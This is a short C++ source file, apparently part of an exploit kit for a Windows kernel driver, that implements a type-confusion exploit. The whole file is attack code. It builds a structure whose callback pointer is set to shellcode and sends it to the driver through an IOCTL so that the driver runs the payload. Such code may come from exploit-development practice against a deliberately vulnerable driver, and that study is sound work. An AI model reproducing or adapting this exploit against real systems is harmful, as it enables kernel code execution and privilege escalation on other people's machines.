#include "TypeConfusion.h"

bool 
ExploitTypeConfusion::exploit() {
	
	struct TypeConfusionObject {
		DWORD unknown;
		void *callback;
	};
	
	auto shellcodePointer = adjustPayloadEpilogue(0);
	
	TypeConfusionObject object = {
		0,
		shellcodePointer.get()
	};
	
	bool ret = driver.SendIOCTL (
		ExploitTypeConfusion::Ioctl_Code,
		&object,
		sizeof(object)
	);
	
	return ret;
}
